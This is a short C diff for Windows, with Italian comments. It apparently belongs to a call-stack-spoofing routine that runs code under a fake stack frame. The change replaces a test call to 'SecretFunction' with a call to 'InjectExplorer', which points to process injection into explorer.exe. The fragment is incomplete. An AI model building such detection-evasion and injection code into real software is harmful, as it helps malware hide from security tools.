@@ -5,7 +5,7 @@ typedef struct _FAKE_FRAME_DATA {
     DWORD64 reserved[5];
 } FAKE_FRAME_DATA;
 
-// Allocate 64 KB isolated stack
+// Alloca 64 KB di stack isolato (PAGE_READWRITE: non eseguibile)
 void *fakeStackBase = VirtualAlloc(NULL, DEFAULT_STACK_SIZE,
                                    MEM_COMMIT | MEM_RESERVE,
                                    PAGE_READWRITE);
@@ -17,9 +17,6 @@ FAKE_FRAME_DATA fakeFrame = {
     .fakeSp = fakeStackTop
 };
 
-g_captureStack = FALSE;
-DWORD64 result = ExecuteWithFakeFrame(SecretFunction, &fakeFrame,
-                                      (LPVOID)0x44444444); // parametro dummy Sc4
-g_captureStack = TRUE;
+DWORD64 result = ExecuteWithFakeFrame(InjectExplorer, &fakeFrame, NULL);
 
 VirtualFree(fakeStackBase, 0, MEM_RELEASE);
